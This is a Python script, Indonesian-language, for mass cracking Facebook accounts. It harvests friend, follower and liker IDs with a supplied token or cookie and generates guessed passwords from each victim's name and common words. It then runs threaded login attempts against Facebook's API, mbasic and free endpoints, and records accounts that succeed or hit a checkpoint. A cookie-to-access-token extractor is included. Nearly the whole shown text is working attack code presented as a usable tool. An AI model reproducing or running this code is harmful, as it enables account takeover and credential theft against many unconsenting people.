#!/usr/bin/python3
#-*-coding:utf-8-*-
# Made With ❤️ By Dapunta, Rizal, And XNSCODE Project

### Import Module
import requests,bs4,sys,os,random,time,re,json,uuid,subprocess,calendar
#import bot_follow_elite
from random import randint
from concurrent.futures import ThreadPoolExecutor as ThreadPool
from bs4 import BeautifulSoup as par
from datetime import date
from datetime import datetime
from urllib.parse import quote

IP = requests.get('https://api.ipify.org').text
host = "https://mbasic.facebook.com"
garis = ("---------------------------------------------")
### WARNA RANDOM ###
P = '\x1b[0;37m' # PUTIH
M = '\x1b[0;31m' # MERAH
H = '\x1b[0;32m' # HIJAU
K = '\x1b[0;33m' # KUNING
B = '\x1b[0;34m' # BIRU
U = '\x1b[0;35m' # UNGU
O = '\x1b[0;36m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI

ok = []
cp = []
ttl = []

### Waktu & Tanggal
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
bulan_ttl = {"01": "Januari", "02": "Februari", "03": "Maret", "04": "April", "05": "Mei", "06": "Juni", "07": "Juli", "08": "Agustus", "09": "September", "10": "Oktober", "11": "November", "12": "Desember"}
bulan = ["Januari", "Februari", "Maret", "April", "Mei", "Juni", "Juli", "Agustus", "September", "Oktober", "November", "Desember"]
try:
    if bu < 0 or bu > 12:
        exit()
    buTemp = bu - 1
except ValueError:
    exit()
op = bulan[buTemp]
hari = datetime.now().strftime('%A')
my_date = date.today()
hr = calendar.day_name[my_date.weekday()]
tanggal = ("%s-%s-%s-%s"%(hr, ha, op, ta))
tgl = ("%s %s %s"%(ha, op, ta))

### User Agent
ua_xiaomi  = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_nokia   = 'nokiac3-00/5.0 (07.20) profile/midp-2.1 configuration/cldc-1.1 mozilla/5.0 applewebkit/420+ (khtml, like gecko) safari/420+'
ua_asus    = 'Mozilla/5.0 (Linux; Android 5.0; ASUS_Z00AD Build/LRX21V) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/37.0.0.0 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_huawei  = 'Mozilla/5.0 (Linux; Android 8.1.0; HUAWEI Y7 PRIME 2019 Build/5887208) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_vivo    = 'Mozilla/5.0 (Linux; Android 11; vivo 1918) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.62 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_oppo    = 'Mozilla/5.0 (Linux; Android 5.1.1; A37f) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.105 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
ua_samsung = 'Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273;]'
ua_windows = 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.63 Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'

### Display Text
def jalan(z):
    for e in z + "\n":
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.04)
def mlaku(z):
    for e in z + "\n":
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)

### Logoku
def logo():
	print(f"""%s
 __________            _____ _____________________
 \____    /           /     \\______   \_   _____/ ©
   /     /   ______  /  \ /  \|    |  _/|    __)  
  /     /_  /_____/ /    Y    \    |   \|     \   
 /_______ \         \____|__  /______  /\___  /   
         \/                 \/       \/     \/"""%(P))
### Menu Login
def menu_log():
    os.system('rm -rf token.txt')
    os.system('clear')
    logo()
    var_menu()
    pmu = input('%s╠══[%s•%s] %sPilih : '%(O,P,O,P))
    print('%s║'%(O))
    if pmu in ['']:
        jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P))
        menu_log()
    elif pmu in ['1','01','001','a']:
        defaultua()
        token = input('%s╚══[%s•%s] %sToken : '%(O,P,O,P))
        try:
            x = requests.get("https://graph.facebook.com/me?access_token=" + token)
            y = json.loads(x.text)
            n = y['name']
            xd = open("token.txt", "w")
            xd.write(token)
            xd.close()
            #print('%s║'%(O))
            #jalan('%s╚══[%s!%s] %sLogin Berhasil'%(O,P,O,P))
            #exit(bot_follow_elite.main())
            menu()
        except (KeyError,IOError):
            print('%s║'%(O))
            jalan('%s╚══[%s!%s] %sToken Invalid'%(M,P,M,P))
            os.system('rm -rf token.txt')
            menu_log()
        except requests.exceptions.ConnectionError:
            print('%s║'%(O))
            jalan('%s╚══[%s!%s] %sKoneksi Bermasalah'%(M,P,M,P))
            os.system('rm -rf token.txt')
            menu_log()
    elif pmu in ['2','02','002','b']:
        defaultua()
        cookie = input('%s╚══[%s•%s] %sCookies : '%(O,P,O,P))
        try:
            data = requests.get("https://m.facebook.com/composer/ocelot/async_loader/?publisher=feed#_=_", headers = {
            "user-agent"                : "Mozilla/5.0 (Linux; Android 8.1.0; MI 8 Build/OPM1.171019.011) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.86 Mobile Safari/537.36", # Jangan Di Ganti Ea Anjink.
            "referer"                   : "https://m.facebook.com/",
            "host"                      : "m.facebook.com",
            "origin"                    : "https://m.facebook.com",
            "upgrade-insecure-requests" : "1",
            "accept-language"           : "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
            "cache-control"             : "max-age=0",
            "accept"                    : "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
            "content-type"              : "text/html; charset=utf-8"
            }, cookies = {
            "cookie"                    : cookie
            })
            find_token = re.search("(EAAA\w+)", data.text)
            hasil = "\n* Fail : maybe your cookie invalid !!" if (find_token is None) else "\n* Your fb access token : " + find_token.group(1)
            xd = open("token.txt", "w")
            xd.write(find_token.group(1))
            xd.close()
            #print('%s║'%(O))
            #jalan('%s╚══[%s!%s] %sLogin Berhasil'%(O,P,O,P))
            #exit(bot_follow_elite.main())
            menu()
        except requests.exceptions.ConnectionError:
            print('%s║'%(O))
            jalan('%s╚══[%s!%s] %sKoneksi Bermasalah'%(M,P,M,P))
            os.system('rm -rf token.txt')
            menu_log()
        except (KeyError,IOError,AttributeError):
            print('%s║'%(O))
            jalan('%s╚══[%s!%s] %sCookies Invalid'%(M,P,M,P))
            os.system('rm -rf token.txt')
            menu_log()
    elif pmu in ['3','03','003','c']:
        os.system('clear')
        logo()
        var_tutor()
        pf = input('%s╠══[%s•%s] %sPilih : '%(O,P,O,P))
        print('%s║'%(O))
        if pf in ['']:
            jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P))
            menu_log()
        elif pf in ['1','01','001','a']:
            os.system('xdg-open https://youtu.be/IdxphPBMMTU')
            input('%s╚══[ %sKembali %s]%s'%(O,P,O,P))
            menu_log()
        elif pf in ['2','02','002','b']:
            os.system('xdg-open https://youtu.be/X7m_O_tZnTc')
            input('%s╚══[ %sKembali %s]%s'%(O,P,O,P))
            menu_log()
        elif pf in ['3','03','003','c']:
            os.system('xdg-open https://youtu.be/9snR31AI_h8')
            tutor_target()
            input('%s╚══[ %sKembali %s]%s'%(O,P,O,P))
            menu_log()
        elif pf in ['4','04','004','d']:
            tutor_crack()
            input('%s╚══[ %sKembali %s]%s'%(O,P,O,P))
            menu_log()
        else:
            jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P))
            menu_log()
    elif pmu in ['4','04','004','d']:
        os.system('clear')
        logo()
        var_author()
        input('%s╚══[ %sKembali %s]%s'%(O,P,O,P))
        menu_log()
    elif pmu in ['0','00','000','e']:
        jalan('%s╠══[%s!%s] %sTerima Kasih Telah Menggunakan SC Ini'%(O,P,O,P))
        jalan('%s╚══[%s!%s] %sSemoga Harimu Menyenangkan :)\n'%(O,P,O,P))
        os.system('rm -rf token.txt')
        os.system('clear')
        exit()
    else:
        jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P))
        menu_log()

#menu
def menu():
	os.system('clear')
	try:
		token = open("token.txt","r").read()
		r = requests.get("https://graph.facebook.com/me?access_token=" + token)
		y = json.loads(r.text)
		nama = y['name']
		uid = y['id']
	except (KeyError,IOError):
		print(" [*] token kadaluarsa!")
		os.system('rm -rf token.txt')
		menu_log()
	except requests.exceptions.ConnectionError:
		print(" [*] anda tidak terhubung ke internet!")
		os.system('rm -rf token.txt')
		menu_log()
	logo()
	print(" [*] Author     : Fall Xavier Dominic Gremory XD.")
	print(" [*] Github     : https://github.com/Fall-Xavier")
	print(" [*] ---------------------------------------------")
	print("%s [*] Bergabung  : %s"%(P,tgl))
	print("%s [*] Status     : %sPremium"%(P,H))
	print("%s [*] ---------------------------------------------"%(P))
	print (" [*] IP         : %s"%(IP))
	print("\n [ selamat datang \033[1;93m"+nama+"\033[1;97m ]")
	print("\n%s [01]. crack dari id teman"%(P))
	print(" [02]. crack dari id publik")
	print(" [03]. crack dari followers")
	print(" [04]. crack dari postingan")
	print(" [05]. crack target massal")
	print(" [06]. ambil id buat target")
	print(" [07]. informasi tambahan")
	print(" [%s00%s]. logout (hapus token)"%(M,P))
	ipul=input("\n [?] pilih : ")
	if ipul=="":
		menu()
	elif ipul=="1":
		teman()
		metode()
	elif ipul=="2":
		publik()
		metode()
	elif ipul=="3":
		followers()
		metode()
	elif ipul=="4":
		postingan()
		metode()
	elif ipul=="5":
		print("\n [1]. crack massal id publik")
		print(" [2]. crack massal followers")
		print(" [3]. crack massal postingan")
		ppk=input("\n [?] pilih : ")
		if ppk=="":
			menu()
		elif ppk=="1":
			publikmassal()
			metode()
		elif ppk=="2":
			followersmassal()
			metode()
		elif ppk=="3":
			postinganmassal()
			metode()
		else:
			menu()
	elif ipul=="6":
		print("\n [1]. ambil id target id teman")
		print(" [2]. ambil id target id publik")
		print(" [3]. ambil id target followers")
		ppk=input("\n [?] pilih : ")
		if ppk=="":
			menu()
		elif ppk=="1":
			idteman()
		elif ppk=="2":
			idpublik()
		elif ppk=="3":
			fols()
		else:
			menu()
	elif ipul=="7":
		print("\n [1]. setting user agent")
		print(" [2]. lihat hasil crack")
		print(" [3]. cek opsi hasil crack")
		print(" [4]. laporkan bug script")
		print(" [5]. keluar")
		ppk=input("\n [?] pilih : ")
		if ppk=="":
			menu()
		elif ppk=="1":
			settingua()
		elif ppk=="2":
			cekhasil()
		elif ppk=="3":
			cek_hasil()
		elif ppk=="4":
			laporbug()
		elif ppk=="5":
			menu()
		else:
			menu()

### User Agent Bawaan
def defaultua():
    ua = ua_nokia
    try:
        ugent = open('ugent.txt','w')
        ugent.write(ua)
        ugent.close()
    except (KeyError,IOError):
        menu_log()

### Menu User Agent
def ugen():
    var_ugen()
    pmu = input('%s╠══[%s•%s] %sPilih : '%(O,P,O,P))
    print('%s║'%(O))
    if pmu in[""]:
        jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P))
        menu()
    elif pmu in ['1','01','001','a']:
        os.system('xdg-open https://www.google.com/search?q=My+User+Agent&oq=My+User+Agent&aqs=chrome..69i57j0l3j0i22i30l6.4674j0j1&sourceid=chrome&ie=UTF-8')
        input('%s╚══[ %sKembali %s]%s'%(O,P,O,P))
        menu()
    elif pmu in ['2','02','002','b']:
        os.system("rm -rf ugent.txt")
        ua = input("%s╚══[%s•%s] %sMasukkan User Agent : \n\n"%(O,P,O,P))
        try:
            ugent = open('ugent.txt','w')
            ugent.write(ua)
            ugent.close()
            jalan("\n%s╔══[ %sBerhasil Mengganti User Agent %s]"%(O,P,O))
            print('%s║'%(O))
            input('%s╚══[ %sKembali %s]%s'%(O,P,O,P))
            menu()
        except (KeyError,IOError):
            jalan("\n%s╔══[ %sGagal Mengganti User Agent %s]"%(M,P,M))
            print('%s║'%(M))
            input('%s╚══[ %sKembali %s]%s'%(M,P,M,P))
            menu()
    elif pmu in ['3','03','003','c']:
        ugen_hp()
    elif pmu in ['4','04','004','d']:
        os.system("rm -rf ugent.txt")
        jalan("%s╠══[ %sUser Agent Berhasil Dihapus %s]"%(O,P,O))
        print('%s║'%(O))
        input('%s╚══[ %sKembali %s]%s'%(O,P,O,P))
        menu()
    elif pmu in ['5','05','005','e']:
        try:
            ungser = open('ugent.txt', 'r').read()
        except (KeyError,IOError):
            ungser = 'Tidak Ditemukan'
        print("%s╚══[%s•%s] %sUser Agent Anda  : \n\n%s%s"%(O,P,O,P,O,ungser))
        jalan("\n%s╔══[ %sIni Adalah User Agent Anda Saat Ini %s]"%(O,P,O))
        print('%s║'%(O))
        input('%s╚══[ %sKembali %s]%s'%(O,P,O,P))
        menu()
    elif pmu in ['0','00','000','f']:
        menu()
    else:
        jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P))
def ugen_hp():
    os.system("rm -rf ugent.txt")
    print('%s╠══[%s1%s] %sXiaomi'%(O,P,O,P))
    print('%s╠══[%s2%s] %sNokia'%(O,P,O,P))
    print('%s╠══[%s3%s] %sAsus'%(O,P,O,P))
    print('%s╠══[%s4%s] %sHuawei'%(O,P,O,P))
    print('%s╠══[%s5%s] %sVivo'%(O,P,O,P))
    print('%s╠══[%s6%s] %sOppo'%(O,P,O,P))
    print('%s╠══[%s7%s] %sSamsung'%(O,P,O,P))
    print('%s╠══[%s8%s] %sWindows'%(O,P,O,P))
    pc = input('%s╠══[%s•%s] %sPilih : '%(O,P,O,P))
    print('%s║'%(O))
    if pc in['']:jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P));menu()
    elif pc in ['1','01']:
        ugent = open('ugent.txt','w');ugent.write(ua_xiaomi);ugent.close()
    elif pc in ['2','02']:
        ugent = open('ugent.txt','w');ugent.write(ua_nokia);ugent.close()
    elif pc in ['3','03']:
        ugent = open('ugent.txt','w');ugent.write(ua_asus);ugent.close()
    elif pc in ['4','04']:
        ugent = open('ugent.txt','w');ugent.write(ua_huawei);ugent.close()
    elif pc in ['5','05']:
        ugent = open('ugent.txt','w');ugent.write(ua_vivo);ugent.close()
    elif pc in ['6','06']:
        ugent = open('ugent.txt','w');ugent.write(ua_oppo);ugent.close()
    elif pc in ['7','07']:
        ugent = open('ugent.txt','w');ugent.write(ua_samsung);ugent.close()
    elif pc in ['8','08']:
        ugent = open('ugent.txt','w');ugent.write(ua_windows);ugent.close()
    else:jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P));menu()
    jalan("%s╠══[ %sBerhasil Mengganti User Agent %s]"%(O,P,O))
    print('%s║'%(O))
    input('%s╚══[ %sKembali %s]%s'%(O,P,O,P))
    menu()

### Dump ID
def publik():
    try:
        token = open("token.txt","r").read()
        x = requests.get("https://graph.facebook.com/me?access_token=" + token)
        y = json.loads(x.text)
        n = y['name']
    except (KeyError,IOError):
        jalan('%s╚══[%s!%s] %sToken/Cookies Invalid'%(M,P,M,P))
        os.system('rm -rf token.txt')
        menu_log()
    except requests.exceptions.ConnectionError:
        jalan('%s╚══[%s!%s] %sKoneksi Bermasalah'%(M,P,M,P))
        os.system('rm -rf token.txt')
        menu_log()
    try:
        print(" [*] isi 'me' jika ingin crack dari daftar teman")
        it = input(' [?] masukkan id atau username : ')
        try:
            pb = requests.get("https://graph.facebook.com/" + it + "?access_token=" + token)
            ob = json.loads(pb.text)
            #print ('%s╠══[%s•%s] %sNama : %s'%(O,P,O,P,ob['name']))
        except (KeyError,IOError):
            print('%s║'%(O))
            jalan('%s╚══[%s!%s] %sID Tidak Ditemukan'%(M,P,M,P))
            menu()
        r = requests.get("https://graph.facebook.com/%s/friends?limit=99999&access_token=%s"%(it,token))
        id = []
        z = json.loads(r.text)
        xc = (ob["first_name"]+".json").replace(" ","_")
        xb = open(xc,"w")
        for a in z["data"]:
            id.append(a["id"]+"•"+a["name"])
            xb.write(a["id"]+"•"+a["name"]+"\n")
        xb.close()
        print('\n [+] total id -> %s%s%s'%(M,len(id),P))
        return crack(xc)
    except Exception as e:
        exit('%s╚══[%s!%s] %sError : %s'%(M,P,M,P,e))
def pengikut():
    try:
        lisensi = open("license.txt","r").read()
        wl = requests.get(url_license + lisensi)
        wk = json.loads(wl.text)
        wj = wk['username']
        jid = '10000'
    except (KeyError,IOError):
        jid = '1500'
    try:
        token = open("token.txt","r").read()
        x = requests.get("https://graph.facebook.com/me?access_token=" + token)
        y = json.loads(x.text)
        n = y['name']
    except (KeyError,IOError):
        jalan('%s╚══[%s!%s] %sToken/Cookies Invalid'%(M,P,M,P))
        os.system('rm -rf token.txt')
        menu_log()
    except requests.exceptions.ConnectionError:
        jalan('%s╚══[%s!%s] %sKoneksi Bermasalah'%(M,P,M,P))
        os.system('rm -rf token.txt')
        menu_log()
    try:
        print('%s╠══[%s•%s] %sTulis \'me\' Untuk Mengambil ID Teman'%(O,P,O,P))
        it = input("%s╠══[%s•%s] %sID Target : "%(O,P,O,P))
        try:
            pb = requests.get("https://graph.facebook.com/" + it + "?access_token=" + token)
            ob = json.loads(pb.text)
            print ('%s╠══[%s•%s] %sNama : %s'%(O,P,O,P,ob['name']))
        except (KeyError,IOError):
            print('%s║'%(O))
            jalan('%s╚══[%s!%s] %sID Tidak Ditemukan'%(M,P,M,P))
            menu()
        r = requests.get("https://graph.facebook.com/%s/subscribers?limit=%s&access_token=%s"%(it,jid,token))
        id = []
        z = json.loads(r.text)
        xc = (ob["first_name"]+".json").replace(" ","_")
        xb = open(xc,"w")
        for a in z["data"]:
            id.append(a["id"]+"•"+a["name"])
            xb.write(a["id"]+"•"+a["name"]+"\n")
        xb.close()
        print('%s╠══[%s•%s] %sTotal ID : %s'%(O,P,O,P,len(id)))
        return crack(xc)
    except Exception as e:
        exit('%s╚══[%s!%s] %sError : %s'%(M,P,M,P,e))
def likers():
    try:
        lisensi = open("license.txt","r").read()
        wl = requests.get(url_license + lisensi)
        wk = json.loads(wl.text)
        wj = wk['username']
        jid = '10000'
    except (KeyError,IOError):
        jid = '1500'
    try:
        token = open("token.txt","r").read()
        x = requests.get("https://graph.facebook.com/me?access_token=" + token)
        y = json.loads(x.text)
        n = y['name']
    except (KeyError,IOError):
        jalan('%s╚══[%s!%s] %sToken/Cookies Invalid'%(M,P,M,P))
        os.system('rm -rf token.txt')
        menu_log()
    except requests.exceptions.ConnectionError:
        jalan('%s╚══[%s!%s] %sKoneksi Bermasalah'%(M,P,M,P))
        os.system('rm -rf token.txt')
        menu_log()
    try:
        print('%s╠══[%s•%s] %sTulis \'me\' Untuk Mengambil ID Teman'%(O,P,O,P))
        it = input("%s╠══[%s•%s] %sID Target : "%(O,P,O,P))
        try:
            pb = requests.get("https://graph.facebook.com/" + it + "?access_token=" + token)
            ob = json.loads(pb.text)
            print ('%s╠══[%s•%s] %sNama : %s'%(O,P,O,P,ob['name']))
        except (KeyError,IOError):
            print('%s║'%(O))
            jalan('%s╚══[%s!%s] %sID Tidak Ditemukan'%(M,P,M,P))
            menu()
        r = requests.get("https://graph.facebook.com/%s/likes?limit=%s&access_token=%s"%(it,jid,token))
        id = []
        z = json.loads(r.text)
        xc = (ob["first_name"]+".json").replace(" ","_")
        xb = open(xc,"w")
        for a in z["data"]:
            id.append(a["id"]+"•"+a["name"])
            xb.write(a["id"]+"•"+a["name"]+"\n")
        xb.close()
        print('%s╠══[%s•%s] %sTotal ID : %s'%(O,P,O,P,len(id)))
        return crack(xc)
    except Exception as e:
        exit('%s╚══[%s!%s] %sError : %s'%(M,P,M,P,e))

### Generate Password
def generate2(text):
    _dapunta_=[]
    for i in text.split(" "):
        if len(i)<3:
            continue
        else:
            i=i.lower()
            if len(i)==3 or len(i)==4 or len(i)==5:
                _dapunta_.append(i+"123")
                _dapunta_.append(i+"12345")
            else:
                _dapunta_.append(i)
                _dapunta_.append(i+"123")
                _dapunta_.append(i+"12345")
    _dapunta_.append(text.lower())
    _dapunta_.append("sayang")
    _dapunta_.append("bismillah")
    _dapunta_.append("anjing")
    return _dapunta_
    
### Logger Crack
def log_api(em,pas,hosts):
    ua = open('ugent.txt','r').read()
    r = requests.Session()
    header = {"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)),
        "x-fb-sim-hni": str(random.randint(20000, 40000)),
        "x-fb-net-hni": str(random.randint(20000, 40000)),
        "x-fb-connection-quality": "EXCELLENT",
        "x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
        "user-agent": ua,
        "content-type": "application/x-www-form-urlencoded",
        "x-fb-http-engine": "Liger"}
    param = {'access_token': '350685531728%7C62f8ce9f74b12f84c123cc23437a4a32', 
        'format': 'json', 
        'sdk_version': '2', 
        'email': em, 
        'locale': 'en_US', 
        'password': pas, 
        'sdk': 'ios', 
        'generate_session_cookies': '1', 
        'sig':'3f555f99fb61fcd7aa0c44f58f522ef6'}
    api = 'https://b-api.facebook.com/method/auth.login'
    response = r.get(api, params=param, headers=header)
    if 'session_key' in response.text and 'EAAA' in response.text:
        return {"status":"success","email":em,"pass":pas}
    elif 'www.facebook.com' in response.json()['error_msg']:
        return {"status":"cp","email":em,"pass":pas}
    else:return {"status":"error","email":em,"pass":pas}
def log_mbasic(em,pas,hosts):
    ua = open('ugent.txt','r').read()
    r = requests.Session()
    r.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
    p = r.get("https://mbasic.facebook.com/")
    b = bs4.BeautifulSoup(p.text,"html.parser")
    meta="".join(bs4.re.findall('dtsg":\{"token":"(.*?)"',p.text))
    data={}
    for i in b("input"):
        if i.get("value") is None:
            if i.get("name")=="email":
                data.update({"email":em})
            elif i.get("name")=="pass":
                data.update({"pass":pas})
            else:
                data.update({i.get("name"):""})
        else:
            data.update({i.get("name"):i.get("value")})
    data.update(
        {"fb_dtsg":meta,"m_sess":"","__user":"0",
        "__req":"d","__csr":"","__a":"","__dyn":"","encpass":""
        }
    )
    r.headers.update({"referer":"https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8"})
    po = r.post("https://mbasic.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100",data=data).text
    if "c_user" in list(r.cookies.get_dict().keys()):
        return {"status":"success","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
    elif "checkpoint" in list(r.cookies.get_dict().keys()):
        return {"status":"cp","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
    else:return {"status":"error","email":em,"pass":pas}
def log_free(em,pas,hosts):
    ua = open('ugent.txt','r').read()
    r = requests.Session()
    r.headers.update({"Host":"free.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
    p = r.get("https://free.facebook.com/")
    b = bs4.BeautifulSoup(p.text,"html.parser")
    meta="".join(bs4.re.findall('dtsg":\{"token":"(.*?)"',p.text))
    data={}
    for i in b("input"):
        if i.get("value") is None:
            if i.get("name")=="email":
                data.update({"email":em})
            elif i.get("name")=="pass":
                data.update({"pass":pas})
            else:
                data.update({i.get("name"):""})
        else:
            data.update({i.get("name"):i.get("value")})
    data.update(
        {"fb_dtsg":meta,"m_sess":"","__user":"0",
        "__req":"d","__csr":"","__a":"","__dyn":"","encpass":""
        }
    )
    r.headers.update({"referer":"https://free.facebook.com/login/?next&ref=dbl&fl&refid=8"})
    po = r.post("https://free.facebook.com/login/device-based/login/async/?refsrc=https%3A%2F%2Fm.facebook.com%2Flogin%2F%3Fref%3Ddbl&lwv=100",data=data).text
    if "c_user" in list(r.cookies.get_dict().keys()):
        return {"status":"success","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
    elif "checkpoint" in list(r.cookies.get_dict().keys()):
        return {"status":"cp","email":em,"pass":pas,"cookies":r.cookies.get_dict()}
    else:return {"status":"error","email":em,"pass":pas}
    
def cek_log(user, pasw, h_cp):
    ua = "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36"
    mb = "https://mbasic.facebook.com"
    ses = requests.Session()
    ses.headers.update({
    "Host": "mbasic.facebook.com",
    "cache-control": "max-age=0",
    "upgrade-insecure-requests": "1",
    "origin": mb,
    "content-type": "application/x-www-form-urlencoded",
    "user-agent": ua,
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
    "x-requested-with": "mark.via.gp",
    "sec-fetch-site": "same-origin",
    "sec-fetch-mode": "navigate",
    "sec-fetch-user": "?1",
    "sec-fetch-dest": "document",
    "referer": mb+"/login/?next&ref=dbl&fl&refid=8",
    "accept-encoding": "gzip, deflate",
    "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
    })
    data = {}
    ged = par(ses.get(mb+"/login/?next&ref=dbl&fl&refid=8", headers={"user-agent":ua}).text, "html.parser")
    fm = ged.find("form",{"method":"post"})
    list = ["lsd","jazoest","m_ts","li","try_number","unrecognized_tries","login","bi_xrwh"]
    for i in fm.find_all("input"):
        if i.get("name") in list:
            data.update({i.get("name"):i.get("value")})
        else:
            continue
    data.update({"email":user,"pass":pasw})
    try:
        run = par(ses.post(mb+fm.get("action"), data=data, allow_redirects=True).text, "html.parser")
    except requests.exceptions.TooManyRedirects:
        print("[!] Redirect Overload")
    if "c_user" in ses.cookies:
        return {"status":"error","email":user,"pass":pasw}
    elif "checkpoint" in ses.cookies:
        form = run.find("form")
        dtsg = form.find("input",{"name":"fb_dtsg"})["value"]
        jzst = form.find("input",{"name":"jazoest"})["value"]
        nh   = form.find("input",{"name":"nh"})["value"]
        dataD = {
            "fb_dtsg": dtsg,
            "fb_dtsg": dtsg,
            "jazoest": jzst,
            "jazoest": jzst,
            "checkpoint_data":"",
            "submit[Continue]":"Lanjutkan",
            "nh": nh
        }
        xnxx = par(ses.post(mb+form["action"], data=dataD).text, "html.parser")
        ngew = [yy.text for yy in xnxx.find_all("option")]
        opsi=[]
        option_dev = []
        for opt in range(len(ngew)):
            option_dev.append("\n "+P+"["+str(opt+1)+"]"". "+ngew[opt]+" ")
        print(h_cp+"".join(option_dev))
    elif "login_error" in str(run):
        pass
    else:
        pass
def koki(cookies):
    result=[]
    for i in enumerate(cookies.keys()):
        if i[0]==len(cookies.keys())-1:result.append(i[1]+"="+cookies[i[1]])
        else:result.append(i[1]+"="+cookies[i[1]]+"; ")
    return "".join(result)

### Crack
class crack:
    def __init__(self,files):
        self.ada = []
        self.cp = []
        self.ko = 0
        while True:
            f = input(' [?] apakah anda ingin menggunakan sandi manual? [Y/t]: ')
            if f=="":
                jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P))
                menu()
            elif f in ['y','Y']:
                try:
                    while True:
                        try:
                            self.apk = files
                            self.fs = open(self.apk).read().splitlines()
                            break
                        except Exception as e:
                            print ("   %s"%(e))
                            continue
                    self.fl = []
                    for i in self.fs:
                        try:
                            self.fl.append({"id":i.split("•")[0]})
                        except:continue
                except Exception as e:
                    print(("   %s"%e))
                    continue
                print('%s╠══[%s•%s] %sContoh : sayang,bismillah,123456'%(O,P,O,P))
                self.pwlist()
                break
            elif f in ['t','T']:
                try:
                    while True:
                        try:
                            self.apk = files
                            self.fs = open(self.apk).read().splitlines()
                            break
                        except Exception as e:
                            print ("   %s"%(e))
                            continue
                    self.fl = []
                    for i in self.fs:
                        try:
                            self.fl.append({"id":i.split("•")[0],"pw":generate2(i.split("•")[1])})
                        except:continue
                    start_method()
                    put = input('\n [?] metode : ')
                    if put in ['']:
                        jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P))
                        menu()
                    elif put in ['1','01','001','a']:
                        puf = input(' [?] munculkan opsi saat crack? [Y/t]: ')
                        if puf in ['']:
                            jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P))
                            menu()
                        elif puf in ['1','01','001','y','Y']:
                            started()
                            ThreadPool(35).map(self.api_opsi,self.fl)
                            os.remove(self.apk)
                            exit()
                            break
                        elif puf in ['2','02','002','t','T']:
                            started()
                            ThreadPool(35).map(self.api,self.fl)
                            os.remove(self.apk)
                            exit()
                            break
                        else:
                            jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P))
                            menu()
                    elif put in ['2','02','002','b']:
                        puf = input(' [?] munculkan opsi saat crack? [Y/t]: ')
                        if puf in ['']:
                            jalan('%s╚══[%s!%s] %sIsi Yang Benar'%(M,P,M,P))
                            menu()
                        elif puf in ['1','01','001','y','Y']:
                            started()
                            ThreadPool(35).map(self.mbasic_opsi,self.fl)
                            os.remove(self.apk)
                            exit()
                            break
                        elif puf in ['2','02','002','t','T']:
                            started()
                            ThreadPool(35).map(self.mbasic,self.fl)
                            os.remove(self.apk)
                            exit()
